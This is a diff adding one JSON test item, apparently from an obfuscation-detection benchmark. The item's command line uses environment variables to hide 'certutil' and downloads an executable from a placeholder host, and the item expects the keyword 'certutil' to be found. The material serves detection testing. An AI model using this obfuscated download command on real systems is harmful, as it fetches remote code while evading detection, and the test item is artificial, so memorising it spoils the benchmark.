@@ -1,0 +1,10 @@
+{
+  "id": "batch-envvar-cascade-0",
+  "category": "batch-envvar",
+  "command_line": "set a=cer && set b=tutil && start \"\" %a%%b%.exe -urlcache -f http://benchmark.example/x.exe",
+  "expected_keywords": [
+    "certutil"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
